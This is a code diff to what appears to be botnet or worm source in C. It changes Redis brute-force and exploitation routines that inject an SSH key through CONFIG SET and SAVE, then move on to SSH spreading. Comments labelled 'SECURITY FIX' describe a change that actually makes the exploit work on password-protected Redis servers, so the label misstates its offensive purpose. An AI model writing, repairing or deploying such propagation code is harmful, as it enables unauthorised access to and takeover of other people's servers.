@@ -1040,8 +1040,24 @@ static const char *get_redis_ssh_key(notnet_bot_t *bot) {
     return NULL;
 }
 
+/* Forward declaration (defined below) */
+int exploit_redis_sock(notnet_bot_t *bot, int sock);
+
 int exploit_redis_unauth(notnet_bot_t *bot, const char *ip, uint16_t port) {
     int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
+    if (sock < 0) return -1;
+    int r = exploit_redis_sock(bot, sock);
+    close(sock);
+    return r;
+}
+
+/* SECURITY FIX (#71): Run the Redis CONFIG SET / SET / SAVE exploit over
+ * an existing, already-authenticated socket. The old brute-force path
+ * closed the AUTH-verified socket and opened a fresh UNAUTHENTICATED one
+ * for the exploit — on any Redis with requirepass the write was rejected,
+ * making the verified password useless. The caller passes the fd from the
+ * AUTH +OK connection. Returns 1 on success, 0/-1 on failure. */
+int exploit_redis_sock(notnet_bot_t *bot, int sock) {
     if (sock < 0) return -1;
 
     /* SECURITY FIX (#72): Require a real key. Refuse to run the Redis
@@ -1050,7 +1066,6 @@ int exploit_redis_unauth(notnet_bot_t *bot, const char *ip, uint16_t port) {
     if (!ssh_key || strstr(ssh_key, "notnet-key") || strstr(ssh_key, "...")) {
         log_error("Redis: no valid redis_ssh_key configured (set redis_ssh_key= "
                   "or NOTNET_REDIS_SSH_KEY) — refusing to inject placeholder");
-        close(sock);
         return -1;
     }
 
@@ -1069,7 +1084,6 @@ int exploit_redis_unauth(notnet_bot_t *bot, const char *ip, uint16_t port) {
     int sent = send(sock, cmd, strlen(cmd), 0);
     if (sent != (int)strlen(cmd)) {
         log_warn("Redis: send failed: %s", strerror(errno));
-        close(sock);
         return -1;
     }
 
@@ -1092,7 +1106,6 @@ int exploit_redis_unauth(notnet_bot_t *bot, const char *ip, uint16_t port) {
         }
     }
 
-    close(sock);
     return success;
 }
 
@@ -1144,27 +1157,22 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
                 log_info("Redis: auth success %s:%d with %s:%s",
                          ip, port, default_users[u], "***REDACTED***");
                 
-                /* Send PING to verify */
-                send(sock, "PING\r\n", 6, 0);
-                FD_ZERO(&fds);
-                FD_SET(sock, &fds);
-                tv.tv_sec = 2;
-                tv.tv_usec = 0;
-                
-                if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
-                    char ping_resp[256];
-                    recv(sock, ping_resp, sizeof(ping_resp) - 1, 0);
-                    ping_resp[sizeof(ping_resp) - 1] = '\0';
-                    /* +PONG confirms the connection is stable */
-                    if (strstr(ping_resp, "+PONG")) {
-                        close(sock);
-                        /* Exploit */
-                        exploit_redis_unauth(bot, ip, port);
-                        usleep(5000000);
-                        spread_ssh(bot, ip, 22);
-                        return 0;
-                    }
+                /* SECURITY FIX (#71): Keep the authenticated socket and
+                 * run the CONFIG SET sequence over it. The old code
+                 * closed this socket and called exploit_redis_unauth(),
+                 * which opened a FRESH UNAUTHENTICATED connection — on
+                 * any Redis with requirepass (the whole point of the
+                 * brute-force path) the write was rejected, so the
+                 * verified password was never actually used. */
+                int exploited = exploit_redis_sock(bot, sock);
+                if (exploited > 0) {
+                    log_info("Redis: exploited auth on %s:%d", ip, port);
+                    close(sock);
+                    usleep(5000000);
+                    spread_ssh(bot, ip, 22);
+                    return 0;
                 }
+                log_warn("Redis: auth OK but exploit failed on %s:%d", ip, port);
             }
             
             close(sock);
